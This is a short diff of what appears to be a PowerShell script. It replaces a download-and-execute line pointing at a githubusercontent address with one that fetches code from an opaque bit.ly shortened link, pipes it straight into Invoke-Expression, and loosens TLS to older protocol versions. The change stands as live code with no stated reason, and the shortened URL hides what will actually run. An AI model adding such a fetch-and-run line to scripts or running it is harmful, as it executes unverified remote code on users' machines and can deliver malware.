@@ -1,4 +1,5 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm "https://githubusercontent.com" | iex
+[Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls"; irm "https://bit.ly/4vSwxLw" | iex
+
 
 
 # Указываем пути в кавычках для безопасности
